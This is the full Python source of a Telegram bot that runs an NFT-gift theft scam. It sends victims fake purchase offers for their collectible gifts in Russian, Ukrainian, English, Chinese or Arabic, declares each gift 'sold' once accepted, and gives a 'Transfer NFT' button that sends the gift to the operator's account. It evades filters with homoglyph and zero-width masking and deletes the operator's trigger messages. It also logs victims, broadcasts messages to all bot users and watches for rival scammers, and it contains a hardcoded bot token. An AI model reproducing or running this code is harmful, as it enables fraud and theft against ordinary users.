import html
import json
import re
import sqlite3
import threading
import time
import telebot
from telebot import types
from telebot.apihelper import ApiTelegramException

# ================= CONFIGURATION =================
TOKEN = "9217093222:AAGYb3Lu8L5ppSuHYehYYi4xvdFhMtGK5E0"  # Ваш токен добавлен
DEFAULT_RATE_URL = "tg://send_gift?to=notscalt"  # Переводы идут на @notscalt
DEFAULT_SPEC_URL = "tg://send_gift?to=notscalt"  
OWNERS = {9284318075}  # Ваш ID установлен как овнер

EMOJI_YES, EMOJI_NO = "5776375003280838798", "5778527486270770928"
COIN = {"rate": "5954135079662916434", "unrate": "5264766603584641330"}
SOLD_EMOJI = "5773677501825945508"

LABELS = {
    "u": ("Пpинять", "Oтклoнить", "Пepeдaть NFT", "Кaк пepeдaть?", "Нажмите «Передать NFT» под сообщением.\n\nВ открывшемся окне нажмите «мои», выберите подарок и подтвердите передачу."),
    "i": ("Прийняти", "Відхилити", "Передати NFT", "Як передати?", "Натисніть «Передати NFT» під повідомленням.\n\nУ вікні, що відкрилося, натисніть «мої», виберіть подарунок та підтвердьте передачу."),
    "n": ("Accept", "Reject", "Transfer NFT", "How to transfer?", "Click «Transfer NFT» under the message.\n\nIn the opened window, click «My», select the gift and confirm the transfer."),
    "z": ("接受", "拒绝", "转让 NFT", "如何转让？", "点击消息下方的“转让 NFT”。\n\n在打开的窗口中点击“我的”，选择礼物并确认转让。"),
    "ar": ("قبول", "رفض", "تحويل NFT", "كيفية التحويل؟", "انقر على «تحويل NFT» تحت الرسالة.\n\nفي النافذة المنفتحة، انقر على «الخاصة بي»، حدد الهدية وأكد التحويل."),
}

# ================= INITIALIZATION =================
bot = telebot.TeleBot(TOKEN, parse_mode="HTML", threaded=True, num_threads=8)
lock = threading.Lock()
db = sqlite3.connect("kotakbox.db", check_same_thread=False)

db.executescript("""
CREATE TABLE IF NOT EXISTS cards(
    id INTEGER PRIMARY KEY AUTOINCREMENT, 
    owner_id INT, 
    chat_id INT, 
    message_id INT, 
    bc_id TEXT, 
    link TEXT, 
    text TEXT, 
    created INT, 
    status TEXT DEFAULT 'pending', 
    amount TEXT, 
    kind TEXT, 
    lang TEXT
);
CREATE TABLE IF NOT EXISTS clicks(
    card_id INT, 
    user_id INT, 
    name TEXT, 
    choice TEXT, 
    ts INT
);
CREATE TABLE IF NOT EXISTS settings(
    owner_id INTEGER PRIMARY KEY, 
    yes_label TEXT, 
    no_label TEXT
);
CREATE TABLE IF NOT EXISTS allowed_users(
    user_id INTEGER PRIMARY KEY, 
    is_admin INT DEFAULT 0, 
    is_special INT DEFAULT 0, 
    custom_url TEXT
);
CREATE TABLE IF NOT EXISTS offer_logs(
    id INTEGER PRIMARY KEY AUTOINCREMENT, 
    user_id INT, 
    user_name TEXT, 
    gift_link TEXT, 
    amount TEXT, 
    kind TEXT, 
    lang TEXT, 
    created INT
);
CREATE TABLE IF NOT EXISTS bot_users(
    user_id INTEGER PRIMARY KEY, 
    username TEXT, 
    full_name TEXT, 
    created INT
);
""")
db.commit()

# ================= DATABASE & HELPER FUNCTIONS =================
def q(sql, params=(), one=False, all_=False):
    with lock:
        cur = db.execute(sql, params)
        db.commit()
        return cur.fetchone() if one else (cur.fetchall() if all_ else cur)

def is_allowed(uid): 
    return uid in OWNERS or bool(q("SELECT 1 FROM allowed_users WHERE user_id=?", (uid,), one=True))

def is_admin(uid): 
    return uid in OWNERS or bool(q("SELECT 1 FROM allowed_users WHERE user_id=? AND is_admin=1", (uid,), one=True))

def get_url(oid):
    res = q("SELECT is_special, custom_url FROM allowed_users WHERE user_id=?", (oid,), one=True)
    return (res[1] or DEFAULT_SPEC_URL) if (res and res[0] == 1) else DEFAULT_RATE_URL

def api(func, *args, **kwargs):
    for _ in range(3):
        try: 
            return func(*args, **kwargs)
        except ApiTelegramException as e:
            if "message is not modified" in str(e): 
                return True
            return None
        except: 
            return None
    return None

class Raw(types.JsonSerializable):
    def __init__(self, rows): 
        self.rows = rows
    def to_json(self): 
        return json.dumps({"inline_keyboard": self.rows}, ensure_ascii=False)

def kb(cid, yes, no):
    return Raw([[
        {"text": no, "callback_data": f"c:no:{cid}", "icon_custom_emoji_id": EMOJI_NO},
        {"text": yes, "callback_data": f"c:yes:{cid}", "icon_custom_emoji_id": EMOJI_YES}
    ]])

def rate_kb(lang, cid, oid):
    l = LABELS.get(lang, LABELS["u"])
    return Raw([[{"text": l[2], "url": get_url(oid)}], [{"text": l[3], "callback_data": f"c:how_to:{cid}"}]])

def preview(link): 
    return types.LinkPreviewOptions(is_disabled=False, url=link, prefer_large_media=False, show_above_text=True)

def safe_mask(text):
    parts = re.split(r'(<[^>]+>)', text)
    hg = {'a': 'а', 'e': 'е', 'o': 'о', 'p': 'р', 'c': 'с', 'x': 'х', 'y': 'у', 'i': 'і', 'A': 'А', 'E': 'Е', 'O': 'О', 'P': 'Р', 'C': 'С', 'X': 'Х', 'H': 'Н', 'B': 'В'}
    return "".join([p if (p.startswith('<') and p.endswith('>')) else "\u200C".join([hg.get(ch, ch) for ch in p]) for p in parts])

def padded(body): 
    return safe_mask(body) + "\u200C" * (int(time.time() * 1000) % 4 + 1)

GIFT = re.compile(r"t\.me/nft/([^/?#\s]+?)-(\d+)", re.I)

def emoji(eid, fallback): 
    return f'<tg-emoji emoji-id="{eid}">{fallback}</tg-emoji>'

def gift_ref(link):
    name, num = "gift", "?"
    g = GIFT.search(link)
    if g: 
        name, num = re.sub(r'([A-Z]+)([A-Z][a-z])', r'\1 \2', re.sub(r'([a-z])([A-Z])', r'\1 \2', g.group(1))), g.group(2)
    return f'<a href="{html.escape(link, quote=True)}">{html.escape(name)} #{num}</a>'

def offer_text(oname, link, amount, kind, lang):
    star = "⭐" if kind == "rate" else "💎"
    a, coin, gift, uname = html.escape(str(amount)), emoji(COIN.get(kind, COIN["rate"]), star), gift_ref(link), html.escape(oname)
    if lang == "n": return f"<b>{uname}</b> offers you <b>{a}</b> {coin} for collectible item {gift}.\n\nOffer valid for another <b>6h. 0m.</b>"
    if lang == "z": return f"用户 <b>{uname}</b> 向您出价 <b>{a}</b> {coin} 购买收藏品 {gift}。\n\n此报价有效期还剩 <b>6小时 0分钟</b>。"
    if lang == "i": return f"Користувач <b>{uname}</b> пропонує Вам <b>{a}</b> {coin} за колекційний предмет {gift}.\n\nПропозиція діє ще <b>6 год. 0 хв.</b>."
    if lang == "ar": return f"المستخدم <b>{uname}</b> يعرض عليك <b>{a}</b> {coin} مقابل العنصر المُميز {gift}.\n\nالعرض ساري لمدة <b>6 ساعة 0 دقيقة.</b>"
    return f"Пользoватeль <b>{uname}</b> пpeдлагaет Вам <b>{a}</b> {coin} зa кοллeкциοнный пpедмет {gift}.\n\nПрeдлοжeние дeйствyет eще <b>6 ч. 0 мин.</b>."

def accept_text(link, amount, kind, lang):
    star = "⭐" if kind == "rate" else "💎"
    sold, gift, coin_emoji = emoji(SOLD_EMOJI, "✅"), gift_ref(link), emoji(COIN.get(kind, COIN["rate"]), star)
    a = html.escape(str(amount))
    if lang == "n": b = f"{sold} Gift {gift} successfully sold!\n\n• Transfer the collectible item to the buyer for crediting {a} {coin_emoji}."
    elif lang == "z": b = f"{sold} 礼物 {gift} 成功售出！\n\n• 将收藏品转让给买家以获得 {a} {coin_emoji}。"
    elif lang == "i": b = f"{sold} Подарунок {gift} успішно продано!\n\n• Передайте колекційний предмет покупцю для зарахування {a} {coin_emoji}."
    elif lang == "ar": b = f"{sold} تم بيع العنصر المُميز {gift} بنجاح!\n\n• قم بتحويل العنصر المُميز إلى المشتري لإضافة {a} {coin_emoji}."
    else: b = f"{sold} Подарок {gift} успешно продан!\n\n• Передайте коллекционный предмет покупателю для зачисления {a} {coin_emoji}."
    return f"<b>{b}</b>"

def delete_msg(chat_id, message_id, bc=None):
    if bc:
        for m_fn in [lambda: bot.delete_business_messages(bc, chat_id, [message_id]), lambda: bot.delete_business_messages(bc, [message_id]), lambda: bot.delete_message(chat_id, message_id)]:
            try: 
                m_fn()
                break
            except: 
                pass
    else:
        try: 
            bot.delete_message(chat_id, message_id)
        except: 
            pass

# ================= MESSAGE & OFFER HANDLERS =================
OFFER_REGEX = re.compile(r"ho\s+(?:https?://)?(?:t\.me/nft/)?([a-zA-Z0-9_-]+-\d+)\s+([\d.]+)\s+(rate|unrate)\s+([a-zA-Z]{1,3})", re.I)

def handle_offer(m):
    if not is_allowed(m.from_user.id): 
        return
    mt = OFFER_REGEX.search(m.text or "")
    if not mt: 
        return
    slug, amount, kind, lang = mt.groups()
    kind, lang = kind.lower(), kind.lower()
    lang = {"ru": "u", "ua": "i", "uk": "i", "en": "n", "cn": "z", "zh": "z"}.get(lang, lang)
    if lang not in LABELS: 
        lang = "u"

    link, oname, owner = f"https://t.me/nft/{slug}", m.from_user.first_name or "User", m.from_user.id
    bc = getattr(m, 'business_connection_id', None)

    custom_labels = q("SELECT yes_label,no_label FROM settings WHERE owner_id=?", (owner,), one=True)
    lang_labels = LABELS.get(lang, LABELS["u"])
    dy = (custom_labels[0] or lang_labels[0]) if custom_labels else lang_labels[0]
    dn = (custom_labels[1] or lang_labels[1]) if custom_labels else lang_labels[1]
    
    q("INSERT INTO offer_logs(user_id, user_name, gift_link, amount, kind, lang, created) VALUES(?,?,?,?,?,?,?)", 
      (owner, oname, link, amount, kind, lang, int(time.time())))
    
    body = offer_text(oname, link, amount, kind, lang)
    cid = q("INSERT INTO cards(owner_id,chat_id,bc_id,link,text,created,amount,kind,lang) VALUES(?,?,?,?,?,?,?,?,?)", 
            (owner, m.chat.id, bc, link, re.sub(r"<[^>]+>", "", body), int(time.time()), amount, kind, lang)).lastrowid

    kwargs = {"link_preview_options": preview(link), "reply_markup": kb(cid, dy, dn)}
    if bc: 
        kwargs["business_connection_id"] = bc
        
    sent = api(bot.send_message, m.chat.id, padded(body), **kwargs)
    if sent:
        q("UPDATE cards SET message_id=? WHERE id=?", (sent.message_id, cid))
        delete_msg(m.chat.id, m.message_id, bc)

@bot.message_handler(func=lambda m: bool(m.text and OFFER_REGEX.search(m.text)))
def h_msg(m): 
    handle_offer(m)

@bot.business_message_handler(func=lambda m: bool(m.text and OFFER_REGEX.search(m.text)))
def h_bmsg(m): 
    handle_offer(m)

SCAM_REGEX = re.compile(r"передавай[т]?е\s+мне|лучше\s+мне|мне\s+кидай|мне\s+отда[йв]", re.I)

@bot.message_handler(func=lambda m: bool(m.text and SCAM_REGEX.search(m.text)))
def catch_scam(m):
    if m.from_user.id in OWNERS or is_admin(m.from_user.id): 
        return
    uname = f"@{m.from_user.username}" if m.from_user.username else (m.from_user.first_name or "User")
    t_str = time.strftime('%d.%m %H:%M', time.localtime(m.date))
    msg = f"⚠️ <b>Подозрительное сообщение!</b>\n\n👤 Кто: <b>{html.escape(uname)}</b> (<code>{m.from_user.id}</code>)\n🕒 Время: <code>{t_str}</code>\n💬 Чат: <code>{m.chat.id}</code>\n✉️ Текст: {html.escape(m.text)}"
    for oid in OWNERS: 
        api(bot.send_message, oid, msg, parse_mode="HTML")

# ================= ADMIN & LOGGING COMMANDS =================
@bot.message_handler(commands=["admin"])
def admin_panel(m):
    if not is_admin(m.from_user.id): 
        return api(bot.send_message, m.chat.id, "❌ Доступ запрещен.")
    users = q("SELECT user_id, is_admin, is_special, custom_url FROM allowed_users", all_=True)
    ulist = "\n".join([f"{u[0]} {'(Админ)' if u[1]==1 else ('(Спец)' if u[2]==1 else '(Обычный)')}" for u in users]) or "пусто"
    count = q("SELECT COUNT(*) FROM bot_users", one=True)[0]
    api(bot.send_message, m.chat.id, f"<b>⚙️ Панель администратора</b>\n\nПользователей в боте: <b>{count}</b>\nСписок:\n<code>{ulist}</code>\n\n/add ID | /spec ID [url] | /del ID | /ad [текст]", parse_mode="HTML")

@bot.message_handler(commands=["ad"])
def ad(m):
    if not is_admin(m.from_user.id): 
        return api(bot.send_message, m.chat.id, "❌ Доступ запрещен.")
    parts = m.text.split(maxsplit=1)
    if len(parts) < 2: 
        return api(bot.send_message, m.chat.id, "Формат: <code>/ad Текст</code>", parse_mode="HTML")
    success, failed = 0, 0
    for u in q("SELECT user_id FROM bot_users", all_=True):
        if api(bot.send_message, u[0], parts[1], parse_mode="HTML"): 
            success += 1
        else: 
            failed += 1
        time.sleep(0.05)
    api(bot.send_message, m.chat.id, f"✅ <b>Рассылка завершена!</b>\nУспешно: {success}\nОшибок: {failed}", parse_mode="HTML")

@bot.message_handler(commands=["add", "spec", "del"])
def manage_users(m):
    if not is_admin(m.from_user.id): 
        return api(bot.send_message, m.chat.id, "❌ Доступ запрещен.")
    cmd = m.text.split()[0][1:]
    parts = m.text.split(maxsplit=2)
    if len(parts) < 2 or not parts[1].isdigit(): 
        return api(bot.send_message, m.chat.id, f"Формат: <code>/{cmd} ID [url]</code>", parse_mode="HTML")
    uid = int(parts[1])
    if cmd == "add":
        q("INSERT OR IGNORE INTO allowed_users(user_id, is_admin, is_special) VALUES(?, 0, 0)", (uid,))
        api(bot.send_message, m.chat.id, f"✅ Пользователь <code>{uid}</code> добавлен.")
    elif cmd == "spec":
        url = parts[2].strip() if len(parts) > 2 else DEFAULT_SPEC_URL
        q("INSERT OR REPLACE INTO allowed_users(user_id, is_admin, is_special, custom_url) VALUES(?, 0, 1, ?)", (uid, url))
        api(bot.send_message, m.chat.id, f"✅ Спец-пользователь <code>{uid}</code> сохранен.")
    elif cmd == "del":
        if uid in OWNERS or uid == m.from_user.id: 
            return api(bot.send_message, m.chat.id, "❌ Нельзя удалить владельца.")
        q("DELETE FROM allowed_users WHERE user_id=?", (uid,))
        api(bot.send_message, m.chat.id, f"🗑 Пользователь <code>{uid}</code> удален.")

@bot.message_handler(commands=["log"])
def show_logs(m):
    if m.from_user.id in OWNERS: 
        send_log_page(m.chat.id, 0)

def send_log_page(chat_id, page=0, message_id=None):
    per_page, offset = 30, page * 30
    total = q("SELECT COUNT(*) FROM offer_logs", one=True)[0]
    logs = q("SELECT user_id, user_name, gift_link, amount, kind, lang, created FROM offer_logs ORDER BY id DESC LIMIT ? OFFSET ?", (per_page, offset), all_=True)
    if not logs: 
        text, markup = "<b>📋 Логи офферов:</b>\n\nПусто.", None
    else:
        lines = [f"<b>📋 Логи офферов (Всего: {total}, Стр: {page + 1}):</b>\n"]
        for idx, r in enumerate(logs, start=offset + 1):
            lines.append(f"{idx}. [{time.strftime('%d.%m %H:%M', time.localtime(r[6]))}] <b>{html.escape(str(r[1]))}</b> ({r[0]})\n   🔗 {html.escape(r[2])} | 💰 {r[3]} {r[4]} ({r[5]})")
        text = "\n".join(lines)
        nav = []
        if page > 0: 
            nav.append({"text": "⬅️ Назад", "callback_data": f"log:page:{page - 1}"})
        if offset + per_page < total: 
            nav.append({"text": "Вперед ➡️", "callback_data": f"log:page:{page + 1}"})
        markup = Raw([nav, [{"text": "🗑 Сбросить логи", "callback_data": "log:reset"}]] if nav else [[{"text": "🗑 Сбросить логи", "callback_data": "log:reset"}]])
    
    if message_id: 
        api(bot.edit_message_text, text, chat_id=chat_id, message_id=message_id, reply_markup=markup, parse_mode="HTML")
    else: 
        api(bot.send_message, chat_id, text, reply_markup=markup, parse_mode="HTML")

@bot.callback_query_handler(func=lambda c: bool(c.data) and c.data.startswith("log:"))
def log_cb(c):
    if c.from_user.id not in OWNERS: 
        return api(bot.answer_callback_query, c.id, text="❌ Доступ запрещен.")
    parts = c.data.split(":")
    if parts[1] == "page":
        send_log_page(c.message.chat.id, int(parts[2]), c.message.message_id)
        api(bot.answer_callback_query, c.id)
    elif parts[1] == "reset":
        q("DELETE FROM offer_logs")
        api(bot.edit_message_text, "<b>📋 Логи офферов:</b>\n\nЛоги успешно очищены.", chat_id=c.message.chat.id, message_id=c.message.message_id, parse_mode="HTML")
        api(bot.answer_callback_query, c.id, text="Логи сброшены!")

# ================= CALLBACK QUERY HANDLERS =================
@bot.callback_query_handler(func=lambda c: bool(c.data) and c.data.startswith("c:how_to"))
def how_to(c):
    lang = "u"
    parts = c.data.split(":")
    if len(parts) > 2:
        card = q("SELECT lang FROM cards WHERE id=?", (int(parts[2]),), one=True)
        if card and card[0]: 
            lang = card[0]
    api(bot.answer_callback_query, c.id, text=LABELS.get(lang, LABELS["u"])[4], show_alert=True)

@bot.callback_query_handler(func=lambda c: bool(c.data) and c.data.startswith("c:") and not c.data.startswith("c:how_to"))
def click(c):
    try: 
        _, choice, cid = c.data.split(":")
        cid = int(cid)
    except: 
        return
    
    card = q("SELECT owner_id,text,chat_id,message_id,bc_id,link,status,amount,kind,lang FROM cards WHERE id=?", (cid,), one=True)
    if not card: 
        return api(bot.answer_callback_query, c.id)
    
    owner, _, chat_id, msg_id, bc, link, _, amount, kind, lang = card
    lang = lang if lang in LABELS else "u"

    q("UPDATE cards SET status=? WHERE id=?", (choice, cid))
    api(bot.answer_callback_query, c.id)
    extra = {"business_connection_id": bc} if bc else {}
    uname = f"@{c.from_user.username}" if c.from_user.username else (c.from_user.first_name or "user")

    if choice == "no":
        rm = f'<tg-emoji emoji-id="{EMOJI_NO}">❌</tg-emoji> Вы отказались от предложения.'
        try:
            if bc: 
                bot.edit_message_text(padded(rm), chat_id=chat_id, message_id=msg_id, reply_markup=None, link_preview_options=types.LinkPreviewOptions(is_disabled=True), **extra)
            else: 
                bot.edit_message_text(padded(rm), chat_id=chat_id, message_id=msg_id, reply_markup=None, link_preview_options=types.LinkPreviewOptions(is_disabled=True))
        except:
            if msg_id: 
                delete_msg(chat_id, msg_id, bc)
            api(bot.send_message, chat_id, padded(rm), **extra)
        api(bot.send_message, owner, f"{html.escape(uname)} отклонил оффер", parse_mode="HTML")
    else:
        sb = accept_text(link, amount, kind, lang)
        try:
            if bc: 
                bot.edit_message_text(padded(sb), chat_id=chat_id, message_id=msg_id, link_preview_options=preview(link), reply_markup=rate_kb(lang, cid, owner), **extra)
            else: 
                bot.edit_message_text(padded(sb), chat_id=chat_id, message_id=msg_id, link_preview_options=preview(link), reply_markup=rate_kb(lang, cid, owner))
        except:
            if msg_id: 
                delete_msg(chat_id, msg_id, bc)
            sent = api(bot.send_message, chat_id=chat_id, text=padded(sb), link_preview_options=preview(link), reply_markup=rate_kb(lang, cid, owner), **extra)
            if sent: 
                q("UPDATE cards SET message_id=? WHERE id=?", (sent.message_id, cid))
        api(bot.send_message, owner, f"{html.escape(uname)} принял оффер", parse_mode="HTML")

    q("INSERT INTO clicks VALUES(?,?,?,?,?)", (cid, c.from_user.id, uname, choice, int(time.time())))

@bot.message_handler(commands=["start"])
def start(m):
    uid = m.from_user.id
    q("INSERT OR REPLACE INTO bot_users(user_id, username, full_name, created) VALUES(?,?,?,?)", 
      (uid, m.from_user.username or "", m.from_user.first_name or "User", int(time.time())))
    if not is_allowed(uid): 
        return api(bot.send_message, m.chat.id, "❌ У вас нет доступа к боту.")
    api(bot.send_message, m.chat.id, "<b>Бот активен</b>", parse_mode="HTML")

# ================= EXECUTION LOOP =================
if __name__ == "__main__":
    api(bot.delete_webhook)
    print("Бот запущен локально")
    while True:
        try: 
            bot.polling(non_stop=True, timeout=30, long_polling_timeout=30, interval=2, skip_pending=True)
        except Exception as e: 
            print(f"Ошибка: {e}")
            time.sleep(5)
